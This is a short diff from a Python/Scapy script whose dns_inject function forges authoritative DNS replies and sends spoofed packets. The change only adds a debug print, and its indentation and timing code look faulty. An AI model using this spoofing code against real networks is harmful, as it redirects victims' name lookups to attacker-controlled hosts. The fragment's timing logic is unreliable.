@@ -88,7 +88,7 @@ def dns_inject(pkt):
                       UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                       DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
                       an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata=dns_response))
-        
+            print str(pkt.getlayer(DNS).qr) 
             send(spoofed_packet)
             end = timeit.timeit()
             print "It took ", end - start
